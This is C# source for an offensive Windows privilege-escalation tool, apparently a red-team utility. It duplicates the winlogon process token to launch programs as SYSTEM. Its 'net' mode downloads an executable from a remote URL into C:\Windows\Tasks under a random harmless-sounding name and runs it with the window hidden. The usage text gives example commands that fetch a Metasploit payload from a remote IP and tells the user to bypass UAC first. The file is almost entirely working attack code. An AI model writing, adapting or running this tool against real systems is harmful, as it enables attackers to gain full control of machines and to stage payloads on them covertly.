using System;
using System.Security.Principal;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

//Based upon TokenDuplicator from Magnus Stubman
//https://github.com/magnusstubman/tokenduplicator

namespace GetSystemPriv
{
    class GetSystemPriv
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll")]
        public static extern bool DuplicateToken(
            IntPtr ExistingTokenHandle,
            int SECURITY_IMPERSONATION_LEVEL,
            ref IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(
            IntPtr hToken);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int Length;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpTokenAttributes,
            int SECURITY_IMPERSONATION_LEVEL,
            TOKEN_TYPE TokenType,
            out IntPtr phNewToken);

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            LogonFlags dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        public static bool CheckHighIntegrity()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        //function to create random name for dropped file
        public static string GenerateNeutralName()
        {
            string[] neutral1 = {
                "cosmic", "divine", "eternal", "heavenly", "immortal", "infinite", "mystic", "sacred", "spiritual", "universal", "angelic", "celestial", "divine",
                "godly", "holy", "saintly", "seraphic", "supernal", "blessed", "devout", "godlike", "righteous"
            };

            string[] neutral2 =
            {
                "beast", "alien", "entity", "creature", "monster", "being", "phantom", "spirit", "apparition", "phantasm", "specter", "wraith", "daemon", "devil", "demon", "fiend", "genie", "jinn", "spirit", "sprite", "angel", "cherub", "seraph", "sylph", "nymph", "fairy", "elf", "dwarf", "gnome", "goblin", "orc", "troll", "ogre", "giant", "titan", "dragon", "wyrm", "serpent", "hydra", "basilisk", "cockatrice", "phoenix", "griffin", "hippogriff", "pegasus", "unicorn", "centaur", "minotaur", "harpy", "siren", "mermaid", "naga", "lamia", "gorgon", "medusa", "cyclops", "sphinx", "chimera", "manticore", "kraken", "leviathan", "behemoth", "golem", "homunculus", "automaton", "android", "cyborg", "robot", "machine", "construct", "elemental", "djinn", "efreet", "genie", "nymph", "sylph", "fairy", "angel", "cherub", "seraph", "demon", "devil", "daemon", "fiend", "monster", "beast", "creature", "entity", "alien", "apparition", "phantom", "spirit", "specter", "wraith", "ghost", "zombie", "vampire", "werewolf", "ghoul", "skeleton", "mummy", "lich", "lich", "revenant", "shade", "specter", "wraith", "poltergeist", "banshee", "wight", "soul", "spirit", "phantom", "apparition", "specter", "wraith", "ghost", "zombie", "vampire", "werewolf", "ghoul", "skeleton", "mummy", "lich", "lich", "revenant", "shade", "specter", "wraith", "poltergeist", "banshee"
            };

            Random rnd = new Random();
            string name = neutral1[rnd.Next(neutral1.Length)] + "_" + neutral2[rnd.Next(neutral2.Length)];

            return name;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("  _______         __   _______               __                   ______        __        ");
            Console.WriteLine(" |     __|.-----.|  |_|     __|.--.--.-----.|  |_.-----.--------.|   __ |.----.|__|.--.--.");
            Console.WriteLine(" |    |  ||  -__||   _|__     ||  |  |__ --||   _|  -__|        ||    __/|   _||  ||  |  |");
            Console.WriteLine(" |_______||_____||____|_______||___  |_____||____|_____|__|__|__||___|   |__|  |__| \\___/ ");
            Console.WriteLine("                               |_____|                                                    ");
            Console.WriteLine("                                                                      by Razzty\n");

            if (args.Length != 2)
            {
                Console.WriteLine("Works by duplicating the privileged process token and creating a new process with it.");
                Console.WriteLine("Needs to be executed in high integrity context. Bypass UAC first.");
                Console.WriteLine("This tool is for educational purposes only. Use at your own risk.\n");
                Console.WriteLine("[*] There are two modes available:");
                Console.WriteLine("    - local - Use this mode to elevate privileges with executing local program (ex. your loader or cmd.exe)");
                Console.WriteLine("    - net - Use this mode to elevate privileges with downloading and executing remote program from URL");
                Console.WriteLine("[*] Usage: GetSystemPriv.exe local/net <Path/URL>");
                Console.WriteLine("[*] Examples:"); 
                Console.WriteLine("    - GetSystemPriv.exe local C:\\Users\\test\\Desktop\\msf.exe");
                Console.WriteLine("    - GetSystemPriv.exe net http://10.10.14.15/msf.exe");

                return;
            }

            if (!CheckHighIntegrity())
            {
                Console.WriteLine("[!] You need to be in high integrity context to use this tool.");
                return;
            }

            //In default, we are going to use services.exe as target process
            //Other possibilities that are running as SYSTEM: smss.exe, ntoskrln.exe
            String target = "winlogon";
            string mode = args[0];
            string path = args[1];
            Console.WriteLine("[*] Mode: " + mode);
            Console.WriteLine("[*] High Integrity Context detected!");

            //If there are more processes named from target, we are going to use the first one
            var proc = Process.GetProcessesByName(target)[0];

            if (proc == null)
            {
                Console.WriteLine("[!] Target process not found! Bailing out!");
                return;
            }

            IntPtr hToken = IntPtr.Zero;
            uint TOKEN_DUPLICATE = 0x0002; //https://docs.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-openprocesstoken
            if (!OpenProcessToken(proc.Handle, TOKEN_DUPLICATE, out hToken))
            {
                Console.WriteLine("[!] OpenProcessToken failed with error: {0}", Marshal.GetLastWin32Error());
                return;
            }

            IntPtr hDuplicateToken = IntPtr.Zero;
            if (!DuplicateToken(hToken, 2, ref hDuplicateToken))
            {
                Console.WriteLine("[!] DuplicateToken failed with error: {0}", Marshal.GetLastWin32Error());
                return;
            }

            if (!ImpersonateLoggedOnUser(hDuplicateToken))
            {
                Console.WriteLine("[!] ImpersonateLoggedOnUser failed with error: {0}", Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[*] Duplicated token created!");
            STARTUPINFO si = new STARTUPINFO();
            si.dwFlags = 0x1; //STARTF_USESHOWWINDOW
            si.wShowWindow = 0x0; //SW_HIDE

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

            IntPtr hDuplicateToken2 = IntPtr.Zero;
            uint MAXIMUM_ALLOWED = 0x2000000; //https://docs.microsoft.com/en-us/windows/win32/secauthz/access-mask-format

            if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, ref sa, 2, TOKEN_TYPE.TokenPrimary, out hDuplicateToken2))
            {
                Console.WriteLine("[!] DuplicateTokenEx failed with error: {0}", Marshal.GetLastWin32Error());
                return;
            }

            if (mode == "net")
            {
                //Destination of downloaded file
                String dest = "C:\\Windows\\Tasks\\";
                Console.WriteLine("[*] Downloading file from URL...");
                String generated = GenerateNeutralName() + ".exe";
                Console.WriteLine("[*] Full path of downloaded file: " + dest + generated);
                System.Net.WebClient client = new System.Net.WebClient();
                client.DownloadFile(path, dest + generated);
                
                if (!CreateProcessWithTokenW(hDuplicateToken2, LogonFlags.NetCredentialsOnly, null, dest + generated, CreationFlags.DefaultErrorMode, IntPtr.Zero, null, ref si, out pi))
                {
                    Console.WriteLine("[!] CreateProcessWithTokenW failed with error: {0}", Marshal.GetLastWin32Error());
                    return;
                }

                Console.WriteLine("[*] Process " + generated + " created with SYSTEM token!");
                Console.WriteLine("[*] PID: " + pi.dwProcessId);
            }

            if (mode == "local")
            {
                Console.WriteLine("[*] Executing program from provided path...");
                if (!File.Exists(path))
                {
                    Console.WriteLine("[!] The file does not exist at the specified path: " + path);
                    return;
                }

                if (!CreateProcessWithTokenW(hDuplicateToken2, LogonFlags.NetCredentialsOnly, null, path, CreationFlags.DefaultErrorMode, IntPtr.Zero, null, ref si, out pi))
                {
                    Console.WriteLine("[!] CreateProcessWithTokenW failed with error: {0}", Marshal.GetLastWin32Error());
                    return;
                }

                Console.WriteLine("[*] Process " + path + " created with SYSTEM token!");
                Console.WriteLine("[*] PID: " + pi.dwProcessId);
            }
        }
    }
}
